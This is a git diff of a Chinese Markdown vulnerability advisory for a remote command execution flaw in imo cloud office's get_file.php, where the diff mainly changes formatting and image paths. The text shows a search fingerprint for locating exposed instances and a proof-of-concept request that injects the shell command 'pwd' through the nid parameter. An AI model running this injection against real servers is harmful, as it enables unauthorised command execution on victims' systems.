@@ -1,8 +1,8 @@
-# imo 云办公室 get_file.php 远程命令执行漏洞
+# imo 云办公室 get\_file.php 远程命令执行漏洞
 
 ## 漏洞描述
 
-imo 云办公室 /file/NDisk/get_file.php 过滤不严格导致允许无限制地上传文件，攻击者可以通过该漏洞直接获取网站权限。
+imo 云办公室 /file/NDisk/get\_file.php 过滤不严格导致允许无限制地上传文件，攻击者可以通过该漏洞直接获取网站权限。
 
 ## 漏洞影响
 
@@ -20,9 +20,9 @@ app="iMO-云办公室"
 
 登录页面
 
-![image-20220524171455819](images/202205241720834.png)
+![image-20220524171455819](../.gitbook/assets/202205241720834.png)
 
-漏洞文件 get_file.php
+漏洞文件 get\_file.php
 
 ```
 <?php
@@ -45,4 +45,4 @@ echo json_encode($ret);
 /file/NDisk/get_file.php?cid=1&nid=;pwd;
 ```
 
-![image-20220524172138053](images/202205241721104.png)
+![image-20220524172138053](../.gitbook/assets/202205241721104.png)
